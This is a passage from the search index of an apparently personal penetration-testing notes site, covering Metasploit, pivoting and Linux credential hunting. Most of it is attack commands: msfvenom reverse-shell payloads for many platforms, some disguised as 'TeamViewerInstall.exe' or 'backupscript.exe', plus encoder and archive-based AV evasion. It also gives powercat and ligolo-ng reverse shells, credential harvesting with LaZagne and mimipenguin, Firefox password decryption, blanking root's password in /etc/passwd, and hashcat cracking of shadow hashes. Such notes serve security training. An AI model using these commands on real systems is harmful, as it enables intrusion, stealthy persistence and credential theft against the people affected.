run/exploit\n\n# Run as a job\nmsf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; run -j \n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#targets","title":"Targets","text":"<p>Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.</p> <pre><code>msf6 &gt; show targets\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#payloads","title":"Payloads","text":"<p>Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker.</p> <p>For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).</p> <ul> <li>Start with staged payloads </li> <li>Use non-staged payloads if staged payloads fail.</li> </ul> <pre><code>msf6 &gt; show payloads\n\nmsf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; set payload &lt;NUMBER&gt;\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#enconders","title":"Enconders","text":"<p>Suppose we want to select an Encoder for an existing payload. Then, we can use the show encoders command within the msfconsole to see which encoders are available for our current Exploit module + Payload combination.</p> <pre><code>msf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; show encoders\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#databases","title":"Databases","text":""},{"location":"zNew/Metasploit/Metasploit/#initiate-the-database","title":"Initiate the Database","text":"<pre><code>$ sudo systemctl start postgresql\n$ sudo msfdb init\n$ sudo msfdb run\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#reinitiate-the-database","title":"Reinitiate the Database","text":"<pre><code>$ msfdb reinit\n$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/\n$ sudo service postgresql restart\n$ msfconsole -q\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#using-the-database","title":"Using the Database","text":""},{"location":"zNew/Metasploit/Metasploit/#database-options","title":"Database Options","text":"<pre><code>msf6 &gt; help database\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#workspaces","title":"Workspaces","text":"<p>We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.</p> <pre><code>msf6 &gt; workspace -h\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#importing-scan-results","title":"Importing Scan Results","text":"<pre><code>msf6 &gt; db_import Target.xml\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#data-backup","title":"Data Backup","text":"<pre><code>msf6 &gt; db_export -h\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#hosts","title":"Hosts","text":"<p>The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. </p> <pre><code>msf6 &gt; hosts -h\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#services","title":"Services","text":"<p>The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.</p> <pre><code>msf6 &gt; services -h\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#credentials","title":"Credentials","text":"<p>The creds command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.</p> <pre><code>msf6 &gt; creds -h\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#loot","title":"Loot","text":"<p>The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.</p> <pre><code>msf6 &gt; loot -h\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#plugins","title":"Plugins","text":"<p><code>/usr/share/metasploit-framework/plugins</code></p> <p>If the plugin is found here, we can fire it up inside msfconsole and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:</p> <pre><code>msf6 &gt; load &lt;PLUGIN&gt;\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#installing-new-plugin","title":"Installing New Plugin","text":"<pre><code>$ sudo cp ./&lt;PLUGIN&gt;.rb /usr/share/metasploit-framework/plugins/&lt;PLUGIN&gt;.rb\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#sessions","title":"Sessions","text":"<pre><code># Background the current Session\n[CTRL] + [Z]\n\n# List Active Sessions\nmsf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; sessions\n\n# Start Interaction with Session\nmsf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; sessions -i 1\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#jobs","title":"Jobs","text":"<pre><code>msf6 exploit(multi/handler) &gt; jobs -h\nUsage: jobs [options]\n\nActive job manipulation and interaction.\n\nOPTIONS:\n\n    -K        Terminate all running jobs.\n    -P        Persist all running jobs on restart.\n    -S &lt;opt&gt;  Row search filter.\n    -h        Help banner.\n    -i &lt;opt&gt;  Lists detailed information about a running job.\n    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.\n    -l        List all running jobs.\n    -p &lt;opt&gt;  Add persistence to job by job ID\n    -v        Print more detailed info.  Use with -i and -l\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#importing-modules","title":"Importing Modules","text":"<p>We copy it into the appropriate directory after downloading the exploit. Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, we will be proceeding with copying the .rb script directly into the primary location.</p> <pre><code>$ cp &lt;our_module_here&gt;.rb /usr/share/metasploit-framework/modules/&lt;PATH/&gt;&lt;MODULE&gt;.rb\n$ msfconsole -m /usr/share/metasploit-framework/modules/\nmsf6 &gt; loadpath /usr/share/metasploit-framework/modules/\nmsf6 &gt; reload_all```\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#msfvenom","title":"MSFvenom","text":""},{"location":"zNew/Metasploit/Metasploit/#list","title":"List","text":"<pre><code># Payloads\n$ msfvenom -l payloads\n\n# #Encoders\n$ msfvenom -l encoders \n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#staged-vs-stageless-payloads","title":"Staged vs. Stageless Payloads","text":"<p>Staged payloads create a way for us to send over more components of our attack. We can think of it like we are \"setting the stage\" for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp. When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.</p> <p>Stageless payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on stageless Meterpreter payloads.</p> <p>Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The name will give you your first marker. Take our examples from above, linux/x86/shell/reverse_tcp is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So /shell/ is a stage to send, and /reverse_tcp is another. This will look like it is all pressed together for a stageless payload. Take our example linux/zarch/meterpreter_reverse_tcp. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function /meterpreter_reverse_tcp. For one last quick example of this naming convention, consider these two windows/meterpreter/reverse_tcp and windows/meterpreter_reverse_tcp. The former is a Staged payload. Notice the naming convention separating the stages. The latter is a Stageless payload since we see the shell payload and network communication in the same portion of the name. If the name of the payload doesn't appear quite clear to you, it will often detail if the payload is staged or stageless in the description.</p>"},{"location":"zNew/Metasploit/Metasploit/#payloads_1","title":"Payloads","text":"<pre><code># Staged Payload for Windows\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe\n$ msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe\n\n# Stageless Payload for Windows\n$ msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe\n$ msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe\n\n# Staged Payload for Linux\n$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf\n$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf\n\n# Stageless Payload for Linux\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf\n$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf\n\n# asp   \n$ msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp\n\n# jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp\n\n# war\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war\n\n# php\n$ msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#encoder","title":"Encoder","text":""},{"location":"zNew/Metasploit/Metasploit/#generating-payload-with-encoding","title":"Generating Payload With Encoding","text":"<pre><code>$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b \"\\x00\" -f perl -e x86/shikata_ga_nai\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#multiple-iterations","title":"Multiple Iterations","text":"<pre><code>$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#evasion-techniques","title":"Evasion Techniques","text":"<pre><code>$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz\n$ tar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar\n$ rar a ~/test.rar -p ~/test.js\n\n$ mv test.rar test\n$ rar a test2.rar -p test\n$ mv test2.rar test2\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#meterpreter","title":"Meterpreter","text":"<p>The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.</p> <pre><code>msf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; grep meterpreter show payloads\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#meterpreter-shells","title":"Meterpreter Shells","text":"<p>windows/meterpreter_reverse_https is actually a much more powerful choice because of the encrypted channel, and it allows you to disconnect the payload (and exit msfconsole) without terminating it. And then the payload will automatically get back to you as soon as you set up the handler again.</p>"},{"location":"zNew/Metasploit/Metasploit/#msfvenom-payloads","title":"MSFvenom Payloads","text":"<pre><code># Staged Payloads for Windows\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe\n\n# Stageless Payloads for Windows\n$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe\n$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe\n\n# Staged Payloads for Linux\n$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf\n$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf\n\n# Stageless Payloads for Linux\n$ msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf\n$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf\n\n# asp   \n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp\n\n# jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; example.jsp\n\n# war\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; example.war\n\n# php\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#setting-up-multihandler","title":"Setting Up Multi/Handler","text":"<pre><code>msf6 &gt; use multi/handler\nmsf6 &gt; set payload windows/x64/meterpreter/reverse_tcp\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#interactive-shells","title":"Interactive Shells","text":"<pre><code>meterpreter &gt; shell\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#commands","title":"Commands","text":"<pre><code>meterpreter &gt; help\n\nmsf6 &gt; search local_exploit_suggester\nmeterpreter &gt; search -f \"flag.txt\"\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/","title":"delete","text":""},{"location":"zNew/Pivoting/Pivoting/#dynamic-port-forwarding-with-ssh-and-socks-tunneling","title":"Dynamic Port Forwarding with SSH and SOCKS Tunneling","text":""},{"location":"zNew/Pivoting/Pivoting/#ssh-local-port-forwarding","title":"SSH Local Port Forwarding","text":"<pre><code># Forward port 3306 from 10.129.202.64 to localhost 1234\n$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64\n\n$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#dynamic-port-forwarding","title":"Dynamic Port Forwarding","text":"<pre><code>$ ssh -D 9050 ubuntu@10.129.202.64\n</code></pre> <pre><code>$ tail -4 /etc/proxychains.conf\n\n# meanwile\n# defaults set to \"tor\"\nsocks4  127.0.0.1 9050\n</code></pre> <pre><code>$ proxychains nmap -v -sn 172.16.5.1-200\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#remotereverse-port-forwarding-with-ssh","title":"Remote/Reverse Port Forwarding with SSH","text":"<pre><code>$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080\n</code></pre> <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https\npayload =&gt; windows/x64/meterpreter/reverse_https\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 8000\nlport =&gt; 8000\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started HTTPS reverse handler on https://0.0.0.0:8000\n</code></pre> <pre><code>ubuntu@pivot$ python3 -m http.server 8123\n</code></pre> <pre><code>PS &gt; Invoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"\n</code></pre> <pre><code>$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#socat-redirection","title":"Socat Redirection","text":""},{"location":"zNew/Pivoting/Pivoting/#reverse-shell","title":"Reverse Shell","text":"<pre><code># On pivot machine\n$ socat TCP4-LISTEN:&lt;FORWARD_PORT&gt;,fork TCP4:&lt;OUR_IP:OUR_PORT&gt;\n</code></pre> <ul> <li>Generate reverse msfvenom payload set LHOST has the pivot machine and LPORT FORWARD_PORT</li> <li>Set LHOST = 0.0.0.0 on msfconsole and LPORT ="},{"location":"zNew/Pivoting/Pivoting/#bind-shell","title":"Bind Shell","text":"<ul> <li>Generate reverse msfvenom payload set LHOST has the pivot machine</li> <li>Set LHOST = 0.0.0.0 on msfconsole</li> </ul>"},{"location":"zNew/Pivoting/Pivoting/#port-forwarding-with-windows-netsh","title":"Port Forwarding with Windows Netsh","text":"<pre><code>C:\\Windows\\system32&gt; netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#socks5-tunneling-with-chisel","title":"SOCKS5 Tunneling with Chisel","text":"<p><code>Find PID to kill</code></p> <pre><code>$ lsof -i:8080 \n</code></pre> <pre><code># Local Machine\n$ chisel server --socks5 --reverse`\n\n# Remote machine\n./chisel client --fingerprint f9KLbYov18MaH86fvgZhbVMyTAj4LAT6Iv8E8Nlwy0k= 10.10.15.23:8080 R:8081:127.0.0.1:445\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#ligolo-ng","title":"Ligolo-ng","text":"<p>Guide Video</p> <pre><code># Proxy (Attack)\n$ sudo ip tuntap add user [your_username] mode tun ligolo\n\n$ sudo ip link set ligolo up\n\n$ ./proxy -selfcert\n$ ./proxy -autocert\n</code></pre> <pre><code># Target\n&gt; ./agent -connect 10.10.15.184:11601 --ignore-cert\n</code></pre> <pre><code># Attack\nsession\n\n[Agent : ubuntu@WEB01] \u00bb ifconfig\n\n[Agent : ubuntu@WEB01] \u00bb start\n</code></pre> <p>IPCalculator</p> <pre><code>$ sudo ip route add 172.16.4.0/23 dev ligolo\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#download-and-upload-files-from-and-to-target","title":"Download and Upload files from and to Target","text":"<pre><code># Redirect 8080 on Target machine to our Attack 8080 to upload files to it \n\u00bb listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp\n\n# Redirect 8000 on Target machine to our Attack 8000 to download files from it \n\u00bb listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#reverse-shell-target-machine-to-attack-machine","title":"Reverse Shell Target Machine to Attack Machine","text":"<pre><code># Attack\n[Agent : session] \u00bb listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp\n\n$ nc -lnvp 10000\n</code></pre> <pre><code># Target\nhttps://github.com/besimorhino/powercat/blob/master/powercat.ps1\n\nCopy into powershell\n\n&gt; powercat -c (Internal Pivot Machine Interface) -p 30000 -ep\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#double-pivothttpsmediumcomissamqsousmastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c","title":"Double Pivot[https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c]","text":"<ul> <li>https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/</li> </ul> <p>After access to first machine or pivot, if exists another network we can also pivot to it.</p> <p>First we need to put agent on pivot machine, for it we need to open a port on our attack machine and add a listener on pivot machine to redirect from port 8080 to our local port 9999.</p>"},{"location":"zNew/Pivoting/Pivoting/#upload-agent-to-pivot","title":"Upload Agent to Pivot","text":"<p>Open port to pass our http server</p> <pre><code># Attack\n[Agent : session] \u00bb listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:9999 --tcp\n</code></pre> <pre><code># Target\nDownload agent file from (Internal Pivot Machine Interface):8080\n</code></pre> <pre><code># Attack\n$ sudo ip tuntap add user [your_username] mode tun ligoloSec\n\n$ sudo ip link set ligoloSec up\n\n$ sudo ip route add 172.16.5.155 dev ligoloSec\n\n[Agent : session] \u00bb listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp\n</code></pre> <pre><code># Target\n&gt; ./agent -connect (Internal Pivot Machine Interface):11601 --ignore-cert\n</code></pre> <pre><code># Attack\n[Agent : session] \u00bb start --tun ligoloSec\n</code></pre>"},{"location":"zNew/Pivoting/Pivoting/#forward-ports-from-pivot-machine-to-attack-machine","title":"Forward Ports from Pivot Machine to Attack Machine","text":"<pre><code>$ sudo ip route add 240.0.0.1/32 dev ligolo\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/","title":"Linux","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#delete","title":"delete","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#credential-hunting-in-linux","title":"Credential Hunting in Linux","text":"<p>Files   History     Memory  Key-Rings Configs     Logs    Cache   Browser stored credentials Databases   Command-line History    In-memory Processing   Notes          Scripts            Source codes           Cronjobs           SSH Keys    </p>"},{"location":"zNew/PrivilegeEscalation/Linux/#files","title":"Files","text":"<p>Configuration files     Databases   Notes Scripts     Cronjobs    SSH keys</p>"},{"location":"zNew/PrivilegeEscalation/Linux/#configuration-files","title":"Configuration Files","text":"<pre><code>$ for l in $(echo \".conf .config .cfg .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#credentials-in-configuration-files","title":"Credentials in Configuration Files","text":"<pre><code>$ for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done\n</code></pre> <p>We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.</p>"},{"location":"zNew/PrivilegeEscalation/Linux/#databases","title":"Databases","text":"<pre><code>$ for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#notes","title":"Notes","text":"<pre><code>$ find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#scripts","title":"Scripts","text":"<pre><code>$ for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#cronjobs","title":"Cronjobs","text":"<pre><code>$ cat /etc/crontab\n$ ls -la /etc/cron.*/\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#ssh-keys","title":"SSH Keys","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#ssh-private-keys","title":"SSH Private Keys","text":"<pre><code>$ grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#ssh-public-keys","title":"SSH Public Keys","text":"<pre><code>$ grep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null | grep \":1\"`\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#history","title":"History","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#bash-history","title":"Bash History","text":"<pre><code>$ tail -n5 /home/*/.bash*\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#logs","title":"Logs","text":"<p>Application Logs    Event Logs  Service Logs    System Logs</p> Log File Description /var/log/messages Generic system activity logs. /var/log/syslog Generic system activity logs. /var/log/auth.log (Debian) All authentication related logs. /var/log/secure (RedHat/CentOS) All authentication related logs. /var/log/boot.log Booting information. /var/log/dmesg Hardware and drivers related information and logs. /var/log/kern.log Kernel related warnings, errors and logs. /var/log/faillog Failed login attempts. /var/log/cron Information related to cron jobs. /var/log/mail.log All mail server related logs. /var/log/httpd All Apache related logs. /var/log/mysqld.log All MySQL server related logs. <pre><code>$ for i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#memory-and-cache","title":"Memory and Cache","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#memory-mimipenguinhttpsgithubcomhuntergregalmimipenguin","title":"Memory - (Mimipenguin)[https://github.com/huntergregal/mimipenguin]","text":"<p>this tool requires administrator/root permissions.</p> <pre><code>$ sudo python3 mimipenguin.py`\n$ sudo bash mimipenguin.sh`\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#memory-lazagnehttpsgithubcomalessandrozlazagne","title":"Memory - (LaZagne)[https://github.com/AlessandroZ/LaZagne]","text":"<pre><code>$ sudo python2.7 laZagne.py all`\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#browsers","title":"Browsers","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#firefox-stored-credentials","title":"Firefox Stored Credentials","text":"<pre><code>$ ls -l .mozilla/firefox/ | grep default\n$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#decrypting-firefox-credentialshttpsgithubcomunodefirefox_decrypt","title":"(Decrypting Firefox Credentials)[https://github.com/unode/firefox_decrypt]","text":"<pre><code>$ python3.9 firefox_decrypt.py`\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#browsers-lazagne","title":"Browsers - LaZagne","text":"<pre><code>$ python3 laZagne.py browsers`\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#passwd-shadow-opasswd","title":"Passwd, Shadow &amp; Opasswd","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#passwd-file","title":"Passwd File","text":"<p>Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.</p>"},{"location":"zNew/PrivilegeEscalation/Linux/#editing-etcpasswd-before","title":"Editing /etc/passwd - Before","text":"<p>root:x:0:0:root:/root:/bin/bash</p>"},{"location":"zNew/PrivilegeEscalation/Linux/#editing-etcpasswd-after","title":"Editing /etc/passwd - After","text":"<p>root::0:0:root:/root:/bin/bash</p> <p>Even though the cases shown will rarely occur, we should still pay attention and watch for security gaps because there are applications that require us to set specific permissions for entire folders. If the administrator has little experience with Linux or the applications and their dependencies, the administrator may give write permissions to the /etc directory and forget to correct them.</p>"},{"location":"zNew/PrivilegeEscalation/Linux/#opasswd","title":"Opasswd","text":"<p>The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.</p> <pre><code>$ sudo cat /etc/security/opasswd\n</code></pre> <p>Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.</p>"},{"location":"zNew/PrivilegeEscalation/Linux/#cracking-linux-credentials","title":"Cracking Linux Credentials","text":""},{"location":"zNew/PrivilegeEscalation/Linux/#unshadow","title":"Unshadow","text":"<pre><code>$ sudo cp /etc/passwd /tmp/passwd.bak \n$ sudo cp /etc/shadow /tmp/shadow.bak \n$ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#hashcat-cracking-unshadowed-hashes","title":"Hashcat - Cracking Unshadowed Hashes","text":"<pre><code>$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Linux/#hashcat-cracking-md5-hashes","title":"Hashcat - Cracking MD5 Hashes","text":"<pre><code>$ hashcat -m 500 -a 0 md5-hashes.list 